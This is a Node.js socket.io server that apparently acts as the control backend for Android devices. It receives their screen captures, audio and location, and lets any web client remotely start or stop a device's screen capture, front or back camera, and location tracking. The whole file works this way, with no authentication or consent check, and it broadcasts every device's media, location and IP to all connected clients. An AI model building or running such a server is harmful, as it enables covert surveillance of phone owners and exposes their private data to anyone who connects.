const express = require('express');
const http = require('http');
const cors = require('cors');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
app.use(cors());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// API routes
app.get('/api/status', (req, res) => {
  res.json({
    status: 'online',
    connections: io.engine.clientsCount,
    uptime: process.uptime()
  });
});

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// Store connected devices
const connectedDevices = new Map();

// Event listeners for socket.io
io.on('connection', (socket) => {
  console.log('a user connected:', socket.id);
  
  // Get client IP address
  const clientIP = socket.handshake.address || socket.request.connection.remoteAddress;
  console.log('Client IP:', clientIP);

  // Handle device registration
  socket.on('register-device', (deviceInfo) => {
    const deviceData = {
      id: socket.id,
      ip: clientIP,
      userAgent: socket.handshake.headers['user-agent'],
      connectedAt: new Date().toISOString(),
      ...deviceInfo
    };
    
    connectedDevices.set(socket.id, deviceData);
    console.log('Device registered:', deviceData);
    
    // Broadcast updated device list to all clients
    io.emit('devices-updated', Array.from(connectedDevices.values()));
  });

  // Handle screen sharing event
  socket.on('share-screen', (data) => {
    console.log('Screen data received from:', socket.id, 'size:', data?.data?.length || 0);
    
    // Add device info to the data
    const deviceInfo = connectedDevices.get(socket.id);
    if (deviceInfo) {
      data.deviceInfo = {
        id: deviceInfo.id,
        deviceName: deviceInfo.deviceName,
        ip: deviceInfo.ip
      };
    }
    
    io.emit('share-screen', data);
  });

  // Handle voice sharing event
  socket.on('share-voice', (data) => {
    console.log('Camera data received from:', socket.id, 'size:', data?.data?.length || 0);
    
    // Add device info to the data
    const deviceInfo = connectedDevices.get(socket.id);
    if (deviceInfo) {
      data.deviceInfo = {
        id: deviceInfo.id,
        deviceName: deviceInfo.deviceName,
        ip: deviceInfo.ip
      };
    }
    
    io.emit('share-voice', data);
  });

  // Handle location sharing event
  socket.on('share-location', (data) => {
    console.log('Location data received from:', socket.id);
    
    // Add device info to the data
    const deviceInfo = connectedDevices.get(socket.id);
    if (deviceInfo) {
      data.deviceInfo = {
        id: deviceInfo.id,
        deviceName: deviceInfo.deviceName,
        ip: deviceInfo.ip
      };
    }
    
    io.emit('share-location', data);
  });

  // ===== REMOTE CONTROL EVENTS =====
  // These events are sent FROM the web interface TO the Android devices
  
  // Screen capture remote control
  socket.on('remote-start-screen-capture', (targetDeviceId) => {
    console.log('Remote command: Start screen capture for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      // Send to specific device
      socket.to(targetDeviceId).emit('remote-start-screen-capture');
    } else {
      // Send to all connected devices
      socket.broadcast.emit('remote-start-screen-capture');
    }
  });
  
  socket.on('remote-stop-screen-capture', (targetDeviceId) => {
    console.log('Remote command: Stop screen capture for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-stop-screen-capture');
    } else {
      socket.broadcast.emit('remote-stop-screen-capture');
    }
  });
  
  // Camera remote control
  socket.on('remote-start-camera', (data) => {
    const { targetDeviceId, camera } = data || {};
    console.log('Remote command: Start camera', camera, 'for device:', targetDeviceId || 'all devices');
    const cameraData = { camera: camera || 'back' };
    
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-start-camera', cameraData);
    } else {
      socket.broadcast.emit('remote-start-camera', cameraData);
    }
  });
  
  socket.on('remote-stop-camera', (targetDeviceId) => {
    console.log('Remote command: Stop camera for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-stop-camera');
    } else {
      socket.broadcast.emit('remote-stop-camera');
    }
  });
  
  socket.on('remote-switch-camera', (targetDeviceId) => {
    console.log('Remote command: Switch camera for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-switch-camera');
    } else {
      socket.broadcast.emit('remote-switch-camera');
    }
  });
  
  // Location remote control
  socket.on('remote-start-location', (targetDeviceId) => {
    console.log('Remote command: Start location for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-start-location');
    } else {
      socket.broadcast.emit('remote-start-location');
    }
  });
  
  socket.on('remote-stop-location', (targetDeviceId) => {
    console.log('Remote command: Stop location for device:', targetDeviceId || 'all devices');
    if (targetDeviceId) {
      socket.to(targetDeviceId).emit('remote-stop-location');
    } else {
      socket.broadcast.emit('remote-stop-location');
    }
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('user disconnected:', socket.id);
    connectedDevices.delete(socket.id);
    
    // Broadcast updated device list to all clients
    io.emit('devices-updated', Array.from(connectedDevices.values()));
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
